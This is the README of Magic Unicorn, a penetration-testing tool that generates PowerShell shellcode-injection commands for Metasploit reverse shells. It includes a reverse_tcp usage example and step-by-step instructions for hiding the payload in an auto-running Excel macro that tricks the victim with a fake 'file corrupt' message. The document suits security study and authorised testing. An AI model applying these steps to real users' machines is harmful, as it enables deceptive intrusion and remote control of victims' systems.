unicorn
=======

Magic Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.

Usage is simple, just run Magic Unicorn (ensure Metasploit is installed and in the right path) and magic unicorn will automatically generate a powershell command that you need to simply cut and paste the powershell code into a command line window or through a payload delivery system.

root@bt:~/Desktop# python unicorn.py 

                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  | 
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:

Unicorn is a PowerShell injection tool utilizing Matthew Graebers attack and expanded to automatically downgrade the process if a 64 bit platform is detected. This is useful in order to ensure that we can deliver a payload with just one set of shellcode instructions. This will work on any version of Windows with PowerShell installed. Simply copy and paste the output and wait for the shells.

Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)

Happy Unicorns.


Usage: python unicorn.py payload reverse_ipaddr port
Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443


[*******************************************************************************************************]

                                -----MACRO ATTACK INSTRUCTIONS----

For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you
do that, you will have a developer tab. Create a new macro, call it AutoOpen and paste the generated
code into that. This will automatically run. Note that a message will prompt to the user saying that
the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is
tricking the victim to thinking the excel document is corrupted. You should get a shell through
powershell injection after that.

NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED
TO REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR
WILL HAPPEN!
[*******************************************************************************************************]

[*******************************************************************************************************]

                              -----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains
all of the code needed in order to inject the powershell attack into memory. Note you will need a place
that supports remote command injection of some sort. Often times this could be through an excel/word
doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and
scenarios to where you can use this attack at. Simply paste the powershell_attacks.txt command in
any command prompt window or where you have the ability to call the powershell executable and it
will give a shell back to you. Note that you will need to have a listener enabled in order to capture
the attack.
[*******************************************************************************************************]

